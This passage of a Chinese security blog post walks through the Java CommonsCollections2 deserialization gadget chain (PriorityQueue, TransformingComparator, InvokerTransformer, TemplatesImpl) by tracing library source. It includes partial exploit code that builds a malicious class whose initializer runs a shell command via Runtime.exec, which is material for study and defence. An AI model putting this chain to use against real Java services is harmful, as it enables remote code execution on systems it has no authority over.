class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            Object c = queue[child];</span><br><span class="line">            <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Comparator&lt;? <span class="keyword">super</span> E&gt; comparator)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">        <span class="keyword">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里将一些敏感的代码放到一起；可以看到继heapify方法之后去调用了siftDown方法；在其中判断力comparator是否为空，如果为空就会调用siftDownComparable方法；如果不为空的话就会去调用siftDownUsingComparator方法；追溯一下comparator变量，发现在类的构造器中有其赋值，是可控的；</p>
<p>这里回到heapify方法中，这里通过for循环遍历了queue中的元素，这里有个小坑，很多师傅包括我最开始都认为queue不能被序列化，因为其修饰符的原因，但是这里的for如果想成功触发也就意味着queue需要去序列化成流然后被反序列化拿出执行相应的承接块；那么为什么其可序列化？这里我看了篇文章，其实还是因为我们的PriorityQueue类中，重写了writeObject方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Write out element count, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out array length, for compatibility with 1.5 version</span></span><br><span class="line">    s.writeInt(Math.max(<span class="number">2</span>, size + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the &quot;proper order&quot;.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里看到是将queue数组中写入了值，然后在readObject的地方发生了for循环去读出queue中的数据的代码，Java是允许对象字节实现序列化方法的，以此来实现对自己的成员控制。</p>
<p>解决了这个点，继续向下看；</p>
<p>在siftDownUsingComparator方法中看到了comparator.compare的调用方式；因为comparator是可控的，这里我们可以参考CC1的思路；所以我们可以传入一个继承Comparator接口的实例，然后去调用到相应类下的compare比较方法；这里原作者使用的是TransformingComparator类；追溯过去；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformingComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Comparator decorated;</span><br><span class="line">    <span class="keyword">protected</span> Transformer transformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(Transformer transformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(transformer, <span class="keyword">new</span> ComparableComparator());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.decorated = decorated;</span><br><span class="line">        <span class="keyword">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object obj1, Object obj2)</span> </span>&#123;</span><br><span class="line">        Object value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">        Object value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其继承了Comparator接口；而且可以直接调用到compare方法；而且选择这个类的还有一个好处是我们看到了transform方法；而且发现啊transformer是可控的，那么有一种强烈的感觉，这个点和CC1类似；transformer都是继承Transformer接口；那么直接控制transformer为InvokerTransformer类对象；直接去到transform方法；追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> O <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到transform方法返回值为任意的类型；那么这个点就很宽松了;下面才是这个链有意思的地方；</p>
<p>可将其input赋值为TemplatesImpl类对象，然后getMethod就为其类对象下的newInstance方法；在这个方法里有我们利用的点：追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    TransformerImpl transformer = <span class="keyword">new</span> TransformerImpl(<span class="keyword">this</span>.getTransletInstance(), <span class="keyword">this</span>._outputProperties, <span class="keyword">this</span>._indentNumber, <span class="keyword">this</span>._tfactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(<span class="keyword">this</span>._uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._tfactory.getFeature(<span class="string">&quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;</span>)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里面掉用了getTransletInstance方法，继续追溯一下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    ErrorMsg err;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>._name == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._class == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>.defineTransletClasses();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet)<span class="keyword">this</span>._class[<span class="keyword">this</span>._transletIndex].newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(<span class="keyword">this</span>._auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var3) &#123;</span><br><span class="line">        err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;TRANSLET_OBJECT_ERR&quot;</span>, <span class="keyword">this</span>._name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var4) &#123;</span><br><span class="line">        err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;TRANSLET_OBJECT_ERR&quot;</span>, <span class="keyword">this</span>._name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这里进行了._class值的判断，判断其是否为空；然后如果为空的话调用defineTransletClasses方法，这里追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>._bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;NO_TRANSLET_CLASS_ERR&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        ErrorMsg err;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> classCount = <span class="keyword">this</span>._bytecodes.length;</span><br><span class="line">            <span class="keyword">this</span>._class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">this</span>._auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; ++i) &#123;</span><br><span class="line">                <span class="keyword">this</span>._class[i] = loader.defineClass(<span class="keyword">this</span>._bytecodes[i]);</span><br><span class="line">                Class superClass = <span class="keyword">this</span>._class[i].getSuperclass();</span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    <span class="keyword">this</span>._transletIndex = i;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>._auxClasses.put(<span class="keyword">this</span>._class[i].getName(), <span class="keyword">this</span>._class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;NO_MAIN_TRANSLET_ERR&quot;</span>, <span class="keyword">this</span>._name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassFormatError var5) &#123;</span><br><span class="line">            err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;TRANSLET_CLASS_ERR&quot;</span>, <span class="keyword">this</span>._name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LinkageError var6) &#123;</span><br><span class="line">            err = <span class="keyword">new</span> ErrorMsg(<span class="string">&quot;TRANSLET_OBJECT_ERR&quot;</span>, <span class="keyword">this</span>._name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>漏洞问题承接点在for循环里；这里我们可看到在for循环中，首先拿到<code>_bytecodes</code>参数的长度，然后去实力化一个 Class对象，大小为_<code>bytecodes</code>的字节长度，然后经过for循环一个一个字节的将其赋值给<code>._class</code>属性；这里看你自己构造的class类的大小来定，最后的效果就是将其全部给<code>._class</code>属性，然后class属性拿到我们全部自己构造的class；然后进入if判断；判断其superClass是否为<code>private static String ABSTRACT_TRANSLET = &quot;org.apache.xalan.xsltc.runtime.AbstractTranslet&quot;;</code>如果是的话将整体的字节大小赋值给<code>_transletIndex</code>；随后进入if的判断，判断其是否小于0，这里因为我们控制其为正数；所以这里直接过if；后面的错误也没有触发；然后直接到命令执行点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet)<span class="keyword">this</span>._class[<span class="keyword">this</span>._transletIndex].newInstance();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里直接将其全部的内容进行newInstance函数实力化，以为class在最开始就是new的Class，所以可以直接进行newInstance方法实力化；然后我们构造的java的字节码中有命令执行的Runtime下的exec命令执行点，直接可触发进行rce；</p>
<h2 id="编写exp-思考"><a href="#编写exp-思考" class="headerlink" title="编写exp+思考"></a>编写exp+思考</h2><p>先从java的字节码下手，因为最后的判断为含有漏洞的字节码进行实力化，整体的链条主要还是在利用javassist上；我们先自己随便构造个恶意类；然后设置其父类，让其通过TemplatesImpl类下的最后if判断；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javassist</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));<span class="comment">//加入到路径中</span></span><br><span class="line">classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">CtClass s2mple = classpool.get(s1mple.class.getName());<span class="comment">//拿到s1mple的class对象并将其写入到hashtable中；</span></span><br><span class="line">CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());<span class="comment">//拿到AbstractTranslet的class对象并将其写入hashtalb中；</span></span><br><span class="line">s2mple.setSuperclass(s3mple);<span class="comment">//设置父类；（过if）</span></span><br><span class="line">s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;touch s1mple.sser\&quot;);&quot;</span>);</span><br><span class="line"><span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先来构造一个恶意的class；这里之前引入一个s1mple类，然后拿到其类之后给其添加父类，是为了过最后的执行类的if判断；在恶意的class中加入我们的命令执行点，调用Runtime下的getRuntime方法获取到其对象，然后调用exec方法；直接执行命令；其实核心也就是这个javassist类包的利用；后期就是纯链条；</p>
<p>注意的是如果我们在刚开始的时候没有传入优先级队列中元素，那么size属性在定义中默认为0；那么也就不会导致函数继续向下执行；所以我们这里需要先传入元素；当时我简单看了下源码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设定元素个数的构造器；效果就是构造指定容量的空数组；这里其实我们是否传入都可，我们继续看下；传入之后继续调用构造器去构造</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                     Comparator&lt;? <span class="keyword">super</span> E&gt; comparator)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">    <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">    <span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">    <span class="keyword">this</span>.comparator = comparator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这里给队列数组queue赋值为initialCapacity大小的存储空间；这里不同构造器之间可以依据形参数量确认并通过this进行调；简单的demo如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">    String b;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(a,<span class="string">&quot;asdf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="title">test</span><span class="params">(<span class="keyword">int</span> a,String b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a =a;</span><br><span class="line">        <span class="keyword">this</span>.b =b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        test ss= <span class="keyword">new</span> test(<span class="number">1</span>);</span><br><span class="line">        System.out.println(ss.b);<span class="comment">//输出asdf；</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>回到原题；</p>
<p>我们要想触发其优先级队列排序方法，首先数组里面得存在值才可；所以得先来进行add插入值，否则size为0；将不会进行流程；后期再将其元素调换为TemplatesImpl的实力化对象，方便其利用InvokerTransformer对象下的transform去调用newTransformer方法；这里我测试无论是否在最开始的时候初始化size大小都可以进行下去；随后我简单看了下源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">int</span> i = size;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">        grow(i + <span class="number">1</span>);</span><br><span class="line">    size = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        queue[<span class="number">0</span>] = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

